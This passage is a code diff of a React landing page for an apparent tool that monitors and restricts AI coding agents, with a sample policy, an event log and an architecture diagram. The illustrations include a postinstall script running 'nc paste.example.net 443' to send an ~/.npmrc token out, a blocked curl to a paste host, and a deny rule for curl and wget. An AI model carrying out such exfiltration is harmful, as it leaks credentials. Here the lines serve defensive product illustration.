@@ -3,22 +3,26 @@
 import { useEffect, useRef, useState, type ReactNode } from 'react';
 import Link from 'next/link';
 import {
-  SCHEMES, problems, engineParts, scoreBands, installTabs, INSTALL_CODE,
-  originalStats, optimizedStats, buildRuntimeGraph, supportedHarnesses, type Scheme,
+  SCHEMES, OUTCOME, problems, engineParts, installTabs, INSTALL_CODE,
+  buildRuntimeGraph, supportedAgents, type Scheme,
 } from './data';
 import { Nav, Footer } from './ui';
 import { Reveal } from './reveal';
 import { CountUp } from './countup';
+import { CoverageTable } from './coverage';
 
 const ACCENT = '#1a1d24';
 const CONTENT = 1080;
 const LINE = 'oklch(0.85 0.008 260)';
 const RED = 'oklch(0.6 0.18 25)';
+const AMBER = 'oklch(0.72 0.15 75)';
 
 function FlowNode({ scheme, label, sub, mono, glow, minWidth = 118, delay = 0 }:
   { scheme: Scheme; label: string; sub?: string; mono?: boolean; glow?: boolean; minWidth?: number; delay?: number }) {
   return (
-    <div style={{ opacity: 0, animation: 'fadeInUp .5s ease forwards', animationDelay: `${delay}s` }}>
+    // fill-mode `both` holds the hidden start frame during the delay; with
+    // prefers-reduced-motion the animation is removed and the node simply shows.
+    <div style={{ animation: 'fadeInUp .5s ease both', animationDelay: `${delay}s` }}>
       <div style={{ border: `1px solid ${scheme.border}`, background: scheme.bg, borderRadius: 9, padding: '11px 15px', textAlign: 'center', minWidth, animation: glow ? 'pulseGlow 2.2s ease-in-out infinite' : undefined }}>
         <div style={{ display: 'flex', alignItems: 'center', justifyContent: 'center', gap: 6 }}>
           <div style={{ width: 7, height: 7, borderRadius: '50%', background: scheme.dot, flexShrink: 0 }} />
@@ -64,14 +68,11 @@ function animateScrollTo(el: HTMLElement, left: number, ms = 550): void {
   }, 16);
 }
 
-function VGroup({ label, minWidth = 118 }: { label: string; minWidth?: number }) {
+/** Dashed group: the part of a process tree a given layer cannot see. */
+function Blind({ label, children }: { label: string; children: ReactNode }) {
   return (
-    <div style={{ border: `2px dashed ${RED}`, borderRadius: 12, padding: '10px 8px 2px', display: 'flex', flexDirection: 'column', alignItems: 'center' }}>
-      <div style={{ display: 'flex', flexDirection: 'column', alignItems: 'center' }}>
-        <FlowNode scheme={SCHEMES.blue} label="Search" minWidth={minWidth} />
-        <Line h={16} /><FlowNode scheme={SCHEMES.purple} label="LLM Logic" minWidth={minWidth} />
-        <Line h={16} /><FlowNode scheme={SCHEMES.blue} label="Search" minWidth={minWidth} />
-      </div>
+    <div style={{ border: `2px dashed ${RED}`, borderRadius: 12, padding: '10px 10px 4px', display: 'flex', flexDirection: 'column', alignItems: 'center' }}>
+      <div style={{ display: 'flex', flexDirection: 'column', alignItems: 'center' }}>{children}</div>
       <div style={{ textAlign: 'center', marginTop: 8, fontFamily: 'var(--mono)', fontSize: 10.5, fontWeight: 600, color: 'oklch(0.55 0.18 25)' }}>&rarr; {label}</div>
     </div>
   );
@@ -85,14 +86,57 @@ function Eyebrow({ hue, children }: { hue: string; children: ReactNode }) {
   return <div className="eyebrow" style={{ color: `oklch(0.52 0.15 ${hue})` }}><span className="d" style={{ background: `oklch(0.58 0.17 ${hue})` }} />{children}</div>;
 }
 
+const OUTCOME_LABEL: Record<string, string> = { allowed: 'allowed', observed: 'observed', pending: 'needs approval', blocked: 'blocked' };
+
+const APPROVAL_STATES: Array<[string, string, string]> = [
+  ['paused', 'Hook holds the tool call', SCHEMES.amber.dot],
+  ['approval_pending', 'Routed to payments-leads', SCHEMES.amber.dot],
+  ['approved', 'maya.cohen · “release branch, coordinated”', SCHEMES.green.dot],
+  ['revalidated', 'Same fingerprint, policy v42 still applies', SCHEMES.green.dot],
+  ['resumed', 'The push runs once', SCHEMES.green.dot],
+];
+
+const SUSPEND_STEPS: Array<[string, string, string]> = [
+  ['requested', '14:41:07', 'You clicked Suspend in the console.'],
+  ['delivered', '14:41:08', 'effigentd on alex-mbp received it.'],
+  ['confirmed', '14:41:08', 'Process tree stopped; the endpoint reported back.'],
+];
+
+const EVENTS: Array<[string, keyof typeof OUTCOME | 'would', string, string, string]> = [
+  ['14:32', 'blocked', 'claude-code', 'exec', '/usr/bin/curl https://paste.example.net'],
+  ['14:30', 'pending', 'cursor-agent', 'exec', 'npm install left-pad-pro@2.1.0'],
+  ['14:29', 'allowed', 'claude-code', 'mcp', 'github.create_pull_request'],
+  ['14:27', 'observed', 'codex', 'connect', 'api.openai.com:443'],
+  ['14:21', 'would', 'codex', 'exec', '/usr/bin/wget (learn mode)'],
+  ['14:18', 'observed', 'claude-code', 'file', '~/src/payments/.env'],
+];
+
+const POLICY_JSON = `{
+  "name": "Production guardrails",
+  "priority": 10,
+  "scope": { "teams": ["payments"] },
+  "default": "allow",
+  "rules": [
+    { "id": "force-push",
+      "what": { "classes": ["exec"],
+                "commands": ["git push --force*", "git push -f*"] },
+      "decision": "require_approval",
+      "approval": { "teams": ["payments-leads"],
+                    "ttl_seconds": 900 } },
+    { "id": "no-raw-http",
+      "what": { "binaries": ["/usr/bin/curl", "/usr/bin/wget"] },
+      "decision": "deny" }
+  ]
+}`;
+
 export default function Page() {
   const [tab, setTab] = useState(installTabs[0].key); // first tab — never a stale key
   const graph = buildRuntimeGraph();
 
-  // Mobile "How it works": the two executions become a swipeable slider, and
-  // the first time the section scrolls into view we animate old → new once —
-  // the compile story told as motion. Any touch cancels the tour; desktop and
-  // prefers-reduced-motion keep the static side-by-side.
+  // Mobile "How it works": the two views become a swipeable slider, and the
+  // first time the section scrolls into view we animate gateway → endpoint
+  // once. Any touch cancels the tour; desktop and prefers-reduced-motion keep
+  // the static side-by-side.
   const archRef = useRef<HTMLDivElement>(null);
   const [archSlide, setArchSlide] = useState(0);
   const archTouched = useRef(false);
@@ -147,7 +191,6 @@ export default function Page() {
 
   return (
     <div style={{ width: '100%', overflowX: 'hidden' }}>
-      {/* NAV */}
       <Nav />
 
       {/* HERO */}
@@ -155,36 +198,36 @@ export default function Page() {
         <div style={{ position: 'absolute', inset: 0, backgroundImage: 'radial-gradient(oklch(0.75 0.03 275 / 0.5) 1px, transparent 1px)', backgroundSize: '22px 22px', maskImage: 'radial-gradient(ellipse 70% 60% at 50% 20%, black 40%, transparent 100%)', WebkitMaskImage: 'radial-gradient(ellipse 70% 60% at 50% 20%, black 40%, transparent 100%)' }} />
         <div className="hero-pad" style={{ position: 'relative', maxWidth: CONTENT, margin: '0 auto', padding: '120px 32px 64px' }}>
           <div className="hero-grid" style={{ display: 'grid', gridTemplateColumns: '1fr 460px', gap: 56, alignItems: 'center' }}>
-            <div>
+            <div style={{ minWidth: 0 }}>
               <div style={{ display: 'inline-flex', alignItems: 'center', gap: 8, fontFamily: 'var(--mono)', fontSize: 12.5, color: 'oklch(0.45 0.012 260)', border: '1px solid oklch(0.87 0.005 90)', borderRadius: 20, padding: '6px 14px', marginBottom: 26 }}>
-                <div style={{ width: 6, height: 6, borderRadius: '50%', background: 'var(--green-dot)' }} />Runtime layer for production AI agents
+                <div style={{ width: 6, height: 6, borderRadius: '50%', background: 'var(--green-dot)' }} />Control plane for coding agents
               </div>
-              <h1 className="h-serif" style={{ fontSize: 'clamp(32px, 8vw, 52px)', lineHeight: 1.12, margin: '0 0 22px' }}>Stop paying your agents to <b>think twice</b>.</h1>
-              <div style={{ fontSize: 17, color: 'var(--ink-2)', lineHeight: 1.65, maxWidth: 520, marginBottom: 36 }}>
-                Effigent runs alongside your agents, learns which steps are always the same, and automatically replaces them with efficient deterministic code — dramatically reducing LLM token consumption while eliminating non-deterministic outputs.
+              <h1 className="h-serif" style={{ fontSize: 'clamp(32px, 8vw, 52px)', lineHeight: 1.12, margin: '0 0 22px' }}>See what your coding agents do. <b>Stop what they shouldn&apos;t.</b></h1>
+              <div style={{ fontSize: 17, color: 'var(--ink-2)', lineHeight: 1.65, maxWidth: 530, marginBottom: 36 }}>
+                A small daemon on each Linux and macOS machine sees which agents run and which commands, files, MCP tools and hosts they touch. It enforces your rules on the machine itself, and holds risky actions until a named reviewer approves that exact action.
               </div>
               <div style={{ display: 'flex', alignItems: 'center', flexWrap: 'wrap', gap: 14, marginBottom: 28 }}>
-                <Link href="/developers" className="btn btn-primary" style={{ padding: '13px 26px', fontSize: 14.5, display: 'inline-block' }}>Install in 2 minutes</Link>
-                <Link href="/security" className="btn btn-ghost" style={{ padding: '13px 22px', fontSize: 14.5, display: 'inline-block' }}>Security &amp; privacy</Link>
+                <Link href="/docs/quickstart" className="btn btn-primary" style={{ padding: '13px 26px', fontSize: 14.5, display: 'inline-block' }}>Enroll a machine</Link>
+                <Link href="/docs/enforcement" className="btn btn-ghost" style={{ padding: '13px 22px', fontSize: 14.5, display: 'inline-block' }}>What it can and can&apos;t stop</Link>
               </div>
-              <div style={{ maxWidth: 440, borderRadius: 9, background: 'oklch(0.14 0.01 260)', boxShadow: '0 16px 36px -18px oklch(0.14 0.01 260 / 0.5)', overflow: 'hidden' }}>
+              <div style={{ maxWidth: 460, borderRadius: 9, background: 'oklch(0.14 0.01 260)', boxShadow: '0 16px 36px -18px oklch(0.14 0.01 260 / 0.5)', overflow: 'hidden' }}>
                 <div style={{ display: 'flex', alignItems: 'center', gap: 7, padding: '9px 12px', background: 'oklch(0.19 0.012 260)', borderBottom: '1px solid oklch(0.26 0.012 260)' }}>
                   <div style={{ width: 10, height: 10, borderRadius: '50%', background: 'oklch(0.65 0.17 25)' }} />
                   <div style={{ width: 10, height: 10, borderRadius: '50%', background: 'oklch(0.78 0.15 85)' }} />
                   <div style={{ width: 10, height: 10, borderRadius: '50%', background: 'oklch(0.68 0.16 150)' }} />
-                  <div style={{ margin: '0 auto', fontFamily: 'var(--mono)', fontSize: 11, color: 'oklch(0.55 0.012 260)', transform: 'translateX(-18px)' }}>zsh — effigent install</div>
+                  <div style={{ margin: '0 auto', fontFamily: 'var(--mono)', fontSize: 11, color: 'oklch(0.55 0.012 260)', transform: 'translateX(-18px)' }}>claude — ~/src/payments</div>
                 </div>
-                <div style={{ padding: '14px 16px', fontFamily: 'var(--mono)', fontSize: 13, lineHeight: 1.9 }}>
-                  <div style={{ color: 'oklch(0.85 0.01 150)' }}><span style={{ color: 'oklch(0.55 0.14 150)' }}>&#10142;</span> effigent install claude</div>
-                  <div style={{ color: 'oklch(0.55 0.012 260)' }}>&gt; ✓ SessionEnd hook installed — scoped keys stay local</div>
-                  <div style={{ color: 'oklch(0.55 0.012 260)', display: 'flex', alignItems: 'center', gap: 6 }}>&gt; ✓ every session uploads, each project its own agent<span style={{ display: 'inline-block', width: 7, height: 14, background: 'oklch(0.75 0.01 150)', animation: 'glowPulse 1s step-end infinite' }} /></div>
+                <div style={{ padding: '14px 16px', fontFamily: 'var(--mono)', fontSize: 12.5, lineHeight: 1.85, overflowX: 'auto' }}>
+                  <div style={{ color: 'oklch(0.85 0.01 150)', whiteSpace: 'nowrap' }}><span style={{ color: 'oklch(0.7 0.14 150)' }}>&#9210;</span> Bash(git push --force origin main)</div>
+                  <div style={{ color: 'oklch(0.78 0.12 80)', paddingLeft: 32, textIndent: -16 }}>&#9151; effigent: paused by “Production guardrails”</div>
+                  <div style={{ color: 'oklch(0.55 0.012 260)', paddingLeft: 32 }}>waiting for payments-leads · expires in 15m<span style={{ display: 'inline-block', width: 7, height: 14, marginLeft: 6, verticalAlign: 'middle', background: 'oklch(0.75 0.01 150)', animation: 'glowPulse 1s step-end infinite' }} /></div>
                 </div>
               </div>
             </div>
 
             <div className="hero-graph" style={{ position: 'relative', border: '1px solid var(--line)', borderRadius: 14, background: 'oklch(0.995 0.002 90)', padding: 18, boxShadow: '0 20px 50px -24px oklch(0.2 0.012 260 / 0.25)' }}>
-              <div style={{ display: 'flex', alignItems: 'center', justifyContent: 'space-between', marginBottom: 10, padding: '0 4px' }}>
-                <div style={{ fontFamily: 'var(--mono)', fontSize: 11, color: 'var(--ink-3)', textTransform: 'uppercase', letterSpacing: '0.05em' }}>Live call graph · acme-codegen-agent</div>
+              <div style={{ display: 'flex', alignItems: 'center', justifyContent: 'space-between', gap: 8, marginBottom: 10, padding: '0 4px' }}>
+                <div style={{ fontFamily: 'var(--mono)', fontSize: 11, color: 'var(--ink-3)', textTransform: 'uppercase', letterSpacing: '0.05em' }}>Live graph · alex-mbp</div>
                 <div style={{ display: 'flex', alignItems: 'center', gap: 5, fontFamily: 'var(--mono)', fontSize: 10.5, color: 'var(--green)' }}>
                   <div style={{ width: 5, height: 5, borderRadius: '50%', background: 'oklch(0.6 0.16 150)', animation: 'glowPulse 1.6s ease-in-out infinite' }} />live
                 </div>
@@ -192,25 +235,28 @@ export default function Page() {
               <div style={{ position: 'relative', width: '100%', aspectRatio: '1', maxWidth: 400, margin: '0 auto' }}>
                 {graph.edges.map((e, i) => (
                   <div key={i} style={{ position: 'absolute', left: '50%', top: '50%', width: '38%', height: 2, transformOrigin: '0 50%', transform: `rotate(${e.rot})` }}>
-                    <div style={{ width: '100%', height: '100%', background: `linear-gradient(to right, oklch(0.85 0.01 260), ${e.heatColor})` }} />
-                    <div style={{ position: 'absolute', top: '50%', left: 0, width: 5, height: 5, marginTop: -2.5, borderRadius: '50%', background: e.heatColor, animation: `flowOut ${e.flowDur} linear infinite`, animationDelay: e.flowDelay }} />
+                    <div style={{ width: '100%', height: '100%', background: e.outcome === 'blocked' ? `linear-gradient(to right, oklch(0.85 0.01 260) 0%, ${e.color} 55%, transparent 56%, transparent 62%, ${e.color} 63%)` : `linear-gradient(to right, oklch(0.85 0.01 260), ${e.color})` }} />
+                    <div style={{ position: 'absolute', top: '50%', left: 0, width: 5, height: 5, marginTop: -2.5, borderRadius: '50%', background: e.color, animation: `flowOut ${e.flowDur} linear infinite`, animationDelay: e.flowDelay }} />
                   </div>
                 ))}
                 {graph.nodes.map((n, i) => (
                   <div key={i} style={{ position: 'absolute', left: n.left, top: n.top, transform: 'translate(-50%,-50%)' }}>
-                    <div className="gnode" style={{ position: 'relative', padding: '7px 12px', borderRadius: 8, background: 'oklch(0.99 0.002 90)', border: `1px solid ${n.heatColor}`, fontSize: 11, fontWeight: 600, color: 'oklch(0.28 0.012 260)', whiteSpace: 'nowrap', animation: n.glow ? 'pulseGlow 2.4s ease-in-out infinite' : undefined }}>
+                    <div className="gnode" style={{ position: 'relative', padding: '7px 11px', borderRadius: 8, background: 'oklch(0.99 0.002 90)', border: `1px solid ${n.color}`, fontSize: 11, fontWeight: 600, fontFamily: 'var(--mono)', color: 'oklch(0.28 0.012 260)', whiteSpace: 'nowrap', animation: n.glow ? 'pulseGlow 2.4s ease-in-out infinite' : undefined }}>
                       {n.label}
-                      <div style={{ position: 'absolute', top: -8, right: -8, minWidth: 17, height: 17, padding: '0 3px', borderRadius: 9, background: n.heatColor, color: 'white', fontSize: 9.5, fontWeight: 700, display: 'flex', alignItems: 'center', justifyContent: 'center', fontFamily: 'var(--mono)' }}>{n.count}</div>
+                      <div style={{ position: 'absolute', top: -8, right: -8, minWidth: 17, height: 17, padding: '0 3px', borderRadius: 9, background: n.color, color: 'white', fontSize: 9.5, fontWeight: 700, display: 'flex', alignItems: 'center', justifyContent: 'center', fontFamily: 'var(--mono)' }}>{n.count}</div>
                     </div>
                   </div>
                 ))}
-                <div style={{ position: 'absolute', left: '50%', top: '50%', transform: 'translate(-50%,-50%)', width: 72, height: 72, borderRadius: '50%', background: ACCENT, display: 'flex', alignItems: 'center', justifyContent: 'center', boxShadow: '0 0 0 6px oklch(0.2 0.012 260 / 0.06)', animation: 'pulseGlow 2.2s ease-in-out infinite' }}>
-                  <div style={{ color: 'var(--cream)', fontSize: 10, fontWeight: 700, textAlign: 'center', lineHeight: 1.3, fontFamily: 'var(--mono)' }}>AGENT<br />RUNTIME</div>
+                <div style={{ position: 'absolute', left: '50%', top: '50%', transform: 'translate(-50%,-50%)', width: 76, height: 76, borderRadius: '50%', background: ACCENT, display: 'flex', alignItems: 'center', justifyContent: 'center', boxShadow: '0 0 0 6px oklch(0.2 0.012 260 / 0.06)' }}>
+                  <div style={{ color: 'var(--cream)', fontSize: 9.5, fontWeight: 700, textAlign: 'center', lineHeight: 1.35, fontFamily: 'var(--mono)' }}>CLAUDE<br />CODE<br /><span style={{ fontWeight: 500, opacity: 0.6 }}>pid 48211</span></div>
                 </div>
               </div>
-              <div style={{ display: 'flex', alignItems: 'center', justifyContent: 'space-between', marginTop: 8, padding: '10px 12px', borderRadius: 8, background: 'oklch(0.97 0.005 260)', fontSize: 11, color: 'var(--ink-2)' }}>
-                <div><span style={{ fontWeight: 700, color: 'oklch(0.55 0.15 20)' }}>3</span> hot paths detected</div>
-                <div><span style={{ fontWeight: 700, color: 'oklch(0.4 0.13 150)' }}>$2.12</span> saved / 100 runs</div>
+              <div style={{ display: 'flex', flexWrap: 'wrap', alignItems: 'center', justifyContent: 'center', gap: '6px 14px', marginTop: 8, padding: '10px 12px', borderRadius: 8, background: 'oklch(0.97 0.005 260)', fontSize: 11, color: 'var(--ink-2)' }}>
+                {(Object.keys(OUTCOME) as Array<keyof typeof OUTCOME>).map((k) => (
+                  <span key={k} style={{ display: 'inline-flex', alignItems: 'center', gap: 6 }}>
+                    <span style={{ width: 7, height: 7, borderRadius: '50%', background: OUTCOME[k] }} />{OUTCOME_LABEL[k]}
+                  </span>
+                ))}
               </div>
             </div>
           </div>
@@ -223,7 +269,7 @@ export default function Page() {
           <div className="marquee-track">
             {[0, 1].map((dup) => (
               <div key={dup} style={{ display: 'flex', gap: 56 }} aria-hidden={dup === 1}>
-                {['Claude Code', 'OpenAI Codex', 'LangGraph', 'CrewAI', 'AutoGen', 'OpenAI Agents SDK', 'MCP agents', 'OpenTelemetry'].map((h) => (
+                {[...supportedAgents, 'MCP servers', 'Linux · eBPF', 'macOS · Endpoint Security'].map((h) => (
                   <span key={h} className="marquee-item"><span className="mdot" />{h}</span>
                 ))}
               </div>
@@ -232,19 +278,19 @@ export default function Page() {
         </div>
       </div>
 
-      {/* IMPACT STATS */}
+      {/* FACTS — counts that are true by construction, not customer metrics */}
       <div style={{ borderTop: '1px solid var(--line)' }}>
         <div className="stats-band" style={{ maxWidth: CONTENT, margin: '0 auto', padding: '54px 32px', display: 'grid', gridTemplateColumns: 'repeat(4, 1fr)', gap: 24 }}>
           {([
-            [81, '%', 'fewer steps per run'],
-            [76, '%', 'lower token cost'],
-            [76, '%', 'faster executions'],
-            [2, ' min', 'to install on an agent'],
+            [supportedAgents.length, '', 'agents recognised out of the box'],
+            [6, '', 'action classes a rule can match'],
+            [3, '', 'decisions: allow, deny, require approval'],
+            [1, '', 'action per approval. Never a blanket yes.'],
           ] as Array<[number, string, string]>).map(([n, suffix, label]) => (
             <Reveal key={label}>
               <div style={{ textAlign: 'center' }}>
                 <div className="h-serif" style={{ fontSize: 'clamp(30px, 6vw, 44px)', lineHeight: 1, color: 'var(--ink)' }}>
-                  <CountUp to={n} suffix={suffix} />
+                  <CountUp to={n} suffix={suffix} duration={0.9} />
                 </div>
                 <div style={{ fontSize: 13, color: 'var(--ink-3)', marginTop: 8 }}>{label}</div>
               </div>
@@ -259,14 +305,16 @@ export default function Page() {
         <div className="grid-2" style={{ display: 'grid', gridTemplateColumns: '0.9fr 1.1fr', gap: 60, alignItems: 'start' }}>
           <div>
             <Eyebrow hue="20">The problem</Eyebrow>
-            <h2 className="h-serif" style={{ fontSize: 'clamp(26px, 6vw, 32px)', lineHeight: 1.25, margin: '0 0 16px' }}>Every execution starts <b>almost from scratch</b>.</h2>
-            <div style={{ fontSize: 15, color: 'var(--ink-2)', lineHeight: 1.6, maxWidth: 380 }}>Agents re-derive the same answers run after run — burning tokens, time, and budget on work they&apos;ve already done.</div>
+            <h2 className="h-serif" style={{ fontSize: 'clamp(26px, 6vw, 32px)', lineHeight: 1.25, margin: '0 0 16px' }}>Your agent runs as <b>you</b>, on a machine with a shell.</h2>
+            <div style={{ fontSize: 15, color: 'var(--ink-2)', lineHeight: 1.6, maxWidth: 400 }}>
+              It has your SSH keys, your cloud credentials and your push rights. Most of what it does is fine. These are the ones that aren&apos;t, and none of them involve a bad prompt.
+            </div>
           </div>
           <div className="problems-grid" style={{ display: 'grid', gridTemplateColumns: '1fr 1fr', gap: 12 }}>
             {problems.map((p) => (
-              <div key={p.num} style={{ display: 'flex', flexDirection: 'column', gap: 10, padding: 18, borderRadius: 12, background: p.bg, border: `1px solid ${p.border}` }}>
-                <div style={{ fontFamily: 'var(--mono)', fontSize: 13, fontWeight: 700, color: p.numColor }}>{p.num}</div>
-                <div style={{ fontSize: 14, color: 'oklch(0.28 0.012 260)', lineHeight: 1.45, fontWeight: 500 }}>{p.text}</div>
+              <div key={p.num} style={{ display: 'flex', flexDirection: 'column', gap: 8, padding: 18, borderRadius: 12, background: p.bg, border: `1px solid ${p.border}`, minWidth: 0 }}>
+                <div style={{ fontFamily: 'var(--mono)', fontSize: 12.5, fontWeight: 700, color: p.numColor, overflowWrap: 'anywhere' }}>{p.num}&nbsp;&nbsp;{p.code}</div>
+                <div style={{ fontSize: 13.5, color: 'oklch(0.3 0.012 260)', lineHeight: 1.5 }}>{p.text}</div>
               </div>
             ))}
           </div>
@@ -277,13 +325,16 @@ export default function Page() {
       {/* HOW IT WORKS */}
       <Section id="how">
         <Reveal>
-        <Eyebrow hue="290">How it works</Eyebrow>
-        <h2 className="h-serif" style={{ fontSize: 'clamp(26px, 6vw, 32px)', margin: '0 0 44px', maxWidth: 640 }}>Every execution becomes a graph. Every graph gets <b>compiled down</b>.</h2>
+        <Eyebrow hue="250">How it works</Eyebrow>
+        <h2 className="h-serif" style={{ fontSize: 'clamp(26px, 6vw, 32px)', margin: '0 0 12px', maxWidth: 680 }}>A gateway sees the model call. <b>effigentd sees the process tree.</b></h2>
+        <div style={{ fontSize: 15, color: 'var(--ink-2)', lineHeight: 1.6, maxWidth: 640, marginBottom: 40 }}>
+          Same session, same command. An LLM gateway sits between the agent and the model API, so it never sees what the shell does next. effigentd sits on the machine, in the agent&apos;s hooks and in the kernel.
+        </div>
 
         <div className="arch-panel" style={{ border: '1px solid var(--line)', borderRadius: 14, padding: '32px 28px 24px', background: 'oklch(0.995 0.002 90)' }}>
           {/* mobile-only slider control — hidden on desktop via CSS */}
-          <div className="arch-switch" role="tablist" aria-label="Execution comparison">
-            {['Original', 'Optimized'].map((label, i) => (
+          <div className="arch-switch" role="tablist" aria-label="Gateway vs endpoint view">
+            {['Gateway', 'effigentd'].map((label, i) => (
               <button key={label} role="tab" aria-selected={archSlide === i} className={archSlide === i ? 'on' : ''} onClick={() => archGoTo(i)}>
                 {label}
               </button>
@@ -291,90 +342,197 @@ export default function Page() {
           </div>
           <div ref={archRef} onScroll={onArchScroll} className="arch-grid" style={{ display: 'grid', gridTemplateColumns: '1fr 56px 1fr', gap: 8, alignItems: 'start' }}>
             <div className="arch-col">
-              <div style={{ fontSize: 14.5, fontWeight: 700, color: 'oklch(0.25 0.012 260)', marginBottom: 6 }}>Original Execution</div>
-              <div style={{ display: 'flex', gap: 14, marginBottom: 26, flexWrap: 'wrap' }}>
-                {originalStats.map((s, i) => <div key={i} style={{ fontSize: 12, color: 'var(--ink-3)' }}><span style={{ fontWeight: 600, color: 'oklch(0.3 0.012 260)' }}>{s.value}</span> {s.label}</div>)}
-              </div>
-              <Center><FlowNode scheme={SCHEMES.purple} label="Agent Starts" minWidth={180} delay={0.12} /></Center>
-              <Line /><Center><FlowNode scheme={SCHEMES.purple} label="Planner (Opus 4.8)" minWidth={180} delay={0.24} /></Center>
+              <div style={{ fontSize: 14.5, fontWeight: 700, color: 'oklch(0.25 0.012 260)', marginBottom: 6 }}>What an API gateway sees</div>
+              <div style={{ fontSize: 12, color: 'var(--ink-3)', marginBottom: 26 }}>1 model call logged · 3 processes never seen</div>
+              <Center><FlowNode scheme={SCHEMES.purple} label="Claude Code" sub="alex-mbp · ~/src/payments" minWidth={200} delay={0.12} /></Center>
+              <Line /><Center><FlowNode scheme={SCHEMES.blue} label="Model API call" sub="logged by the gateway" minWidth={200} delay={0.24} /></Center>
+              <Line /><Center><FlowNode scheme={SCHEMES.gray} label="Bash: npm install" mono minWidth={200} /></Center>
               <Line />
-              <div className="vrow" style={{ display: 'flex', gap: 14, justifyContent: 'center' }}>
-                {['extractImports()', 'findRoutes()', 'analyzeDeps()'].map((g) => <VGroup key={g} label={g} minWidth={110} />)}
-              </div>
-              <Line /><Center><VGroup label="compiles to runTests()" minWidth={150} /></Center>
-              <Line /><Center><FlowNode scheme={SCHEMES.green} label="Response" minWidth={180} /></Center>
+              <Center>
+                <Blind label="invisible to the gateway">
+                  <FlowNode scheme={SCHEMES.gray} label="postinstall" mono minWidth={170} />
+                  <Line h={16} /><FlowNode scheme={SCHEMES.gray} label="sh -c …" mono minWidth={170} />
+                  <Line h={16} /><FlowNode scheme={SCHEMES.red} label="nc paste.example.net 443" mono minWidth={170} />
+                </Blind>
+              </Center>
+              <Line /><Center><FlowNode scheme={SCHEMES.red} label="~/.npmrc token leaves" minWidth={200} /></Center>
             </div>
 
-            <div className="arch-arrow" style={{ display: 'flex', alignItems: 'center', justifyContent: 'center', paddingTop: 130 }}>
+            <div className="arch-arrow" style={{ display: 'flex', alignItems: 'center', justifyContent: 'center', paddingTop: 150 }}>
               <div style={{ width: 40, height: 40, borderRadius: '50%', border: `1px solid ${LINE}`, background: 'var(--cream)', display: 'flex', alignItems: 'center', justifyContent: 'center', fontSize: 16, color: 'var(--ink-2)', animation: 'arrowPulse 2.6s ease-in-out infinite' }}>&rarr;</div>
             </div>
 
             <div className="arch-col">
-              <div style={{ fontSize: 14.5, fontWeight: 700, color: 'var(--green)', marginBottom: 6 }}>Optimized Execution</div>
-              <div style={{ display: 'flex', gap: 14, marginBottom: 26, flexWrap: 'wrap' }}>
-                {optimizedStats.map((s, i) => <div key={i} style={{ fontSize: 12, color: 'var(--ink-3)' }}><span style={{ fontWeight: 600, color: 'var(--green)' }}>{s.value}</span> {s.label}</div>)}
-              </div>
-              <Center><FlowNode scheme={SCHEMES.purple} label="User Request" minWidth={180} /></Center>
-              <Line color="var(--green-dot)" /><Center><FlowNode scheme={SCHEMES.purple} label="Planner (Sonnet 5)" minWidth={180} /></Center>
-              <Line color="var(--green-dot)" /><Center><FlowNode scheme={SCHEMES.green} label="Knowledge Graph Lookup" glow minWidth={180} /></Center>
-              <Line color="var(--green-dot)" />
-              <div className="vrow" style={{ display: 'flex', gap: 14, justifyContent: 'center', position: 'relative', paddingTop: 16 }}>
-                <div className="tool-connector" style={{ position: 'absolute', top: 0, left: '14%', right: '14%', height: 1, background: LINE }} />
-                {['extractImports()', 'findRoutes()', 'analyzeDeps()'].map((l) => (
-                  <div key={l} style={{ display: 'flex', flexDirection: 'column', alignItems: 'center' }}>
-                    <div style={{ width: 1, height: 16, background: LINE }} />
-                    <FlowNode scheme={SCHEMES.green} label={l} sub="Tool" mono minWidth={110} />
-                  </div>
-                ))}
-              </div>
-              <Line color="var(--green-dot)" /><Center><FlowNode scheme={SCHEMES.green} label="runTests()" sub="Tool" mono minWidth={180} /></Center>
-              <Line color="var(--green-dot)" /><Center><FlowNode scheme={SCHEMES.gray} label="Small Model (Sonnet 5)" minWidth={180} /></Center>
-              <Line color="var(--green-dot)" /><Center><FlowNode scheme={SCHEMES.green} label="Response" minWidth={180} /></Center>
+              <div style={{ fontSize: 14.5, fontWeight: 700, color: 'var(--green)', marginBottom: 6 }}>What effigentd sees and does</div>
+              <div style={{ fontSize: 12, color: 'var(--ink-3)', marginBottom: 26 }}>1 approval · 1 kernel block · every step in the audit log</div>
+              <Center><FlowNode scheme={SCHEMES.purple} label="Claude Code" sub="pid 48211 · tracked since start" minWidth={200} /></Center>
+              <Line color="var(--green-dot)" /><Center><FlowNode scheme={SCHEMES.amber} label="PreToolUse: npm install" sub="require_approval → maya.cohen approved" mono minWidth={200} /></Center>
+              <Line color="var(--green-dot)" /><Center><FlowNode scheme={SCHEMES.green} label="postinstall" sub="exec · allowed" mono minWidth={200} /></Center>
+              <Line color="var(--green-dot)" /><Center><FlowNode scheme={SCHEMES.green} label="sh -c …" sub="exec · allowed" mono minWidth={200} /></Center>
+              <Line color={RED} /><Center><FlowNode scheme={SCHEMES.red} label="/usr/bin/nc" sub="kernel: EPERM · exec_deny" mono glow minWidth={200} /></Center>
+              <Line color="var(--green-dot)" /><Center><FlowNode scheme={SCHEMES.gray} label="Audit: 5 events, 1 approver" minWidth={200} /></Center>
             </div>
           </div>
 
-          <div style={{ marginTop: 32, display: 'flex', alignItems: 'center', justifyContent: 'space-between', flexWrap: 'wrap', gap: 10, borderRadius: 10, padding: '16px 22px', background: 'linear-gradient(100deg, oklch(0.95 0.03 290) 0%, oklch(0.93 0.035 270) 25%, oklch(0.95 0.03 290) 50%, oklch(0.93 0.035 270) 75%, oklch(0.95 0.03 290) 100%)', backgroundSize: '200% 100%', animation: 'shimmerMove 6s linear infinite' }}>
-            <div style={{ display: 'flex', alignItems: 'center', gap: 8, fontSize: 14, fontWeight: 700, color: 'oklch(0.4 0.13 290)' }}>
-              <div style={{ width: 8, height: 8, borderRadius: '50%', background: 'oklch(0.55 0.16 290)' }} />Effigent Impact
+          <div style={{ marginTop: 32, display: 'flex', alignItems: 'center', justifyContent: 'space-between', flexWrap: 'wrap', gap: 10, borderRadius: 10, padding: '16px 22px', background: 'linear-gradient(100deg, oklch(0.96 0.015 250) 0%, oklch(0.945 0.02 240) 25%, oklch(0.96 0.015 250) 50%, oklch(0.945 0.02 240) 75%, oklch(0.96 0.015 250) 100%)', backgroundSize: '200% 100%', animation: 'shimmerMove 6s linear infinite' }}>
+            <div style={{ display: 'flex', alignItems: 'center', gap: 8, fontSize: 14, fontWeight: 700, color: 'oklch(0.38 0.1 250)' }}>
